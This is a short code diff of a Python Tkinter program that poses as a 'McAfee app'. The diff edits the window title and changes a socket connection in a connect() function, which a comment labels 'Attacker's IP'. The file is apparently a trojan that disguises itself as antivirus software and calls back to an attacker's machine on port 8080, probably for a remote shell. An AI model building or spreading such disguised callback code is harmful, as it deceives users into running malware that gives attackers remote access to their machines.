@@ -19,7 +19,7 @@ import time
 
 root= tk.Tk()
 
-root.title("McAfee app  - Paid Version")
+root.title("McAfee app  ")
 
 canvas1 = tk.Canvas(root, width = 300, height = 300)
 canvas1.pack()
@@ -70,7 +70,7 @@ def connect():
         try:
             
             # Note: Please Place Attacker's IP Here
-            s.connect(('192.168.0.86', 8080))
+            s.connect(('192.168.0.67', 8080))
 
             # Connected
             connected = True
